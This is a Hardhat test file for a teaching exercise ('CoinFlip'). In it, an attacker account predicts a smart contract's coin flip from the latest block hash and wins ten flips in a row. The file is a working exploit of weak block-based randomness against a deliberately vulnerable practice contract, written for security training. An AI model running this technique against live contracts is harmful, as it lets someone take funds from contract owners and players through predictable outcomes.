const { expect } = require("chai");
const { ethers } = require("hardhat");

const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968n;

describe("Exercise 3 - CoinFlip", function () {

    let deployer, attacker;
    const CONSECUTIVE_WINS = 10;

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();
        const CoinFlip = await ethers.getContractFactory("CoinFlip");
        this.contract = await CoinFlip.deploy();
        await this.contract.deployed();
    });


    it("Flip and guess winner", async function () {
        // Call the the flip coin function 10 times
        for (let i = 0; i < CONSECUTIVE_WINS; i++) {
            const guess = await calculateGuess();
            const tx = await this.contract.connect(attacker).flip(guess);
            // wait until the transaction is mined so the block num is different
            await tx.wait();
        }

        expect(await this.contract.consecutiveWins()).to.eq(CONSECUTIVE_WINS)
    });

});


async function calculateGuess() {
    const blockNum = await ethers.provider.getBlockNumber();
    const blockData = await ethers.provider.getBlock(blockNum);
    const blockHash = blockData.hash;
    const blockValue = BigInt(blockHash);
    const coinFlip = blockValue / FACTOR;
    return coinFlip == 1;
}
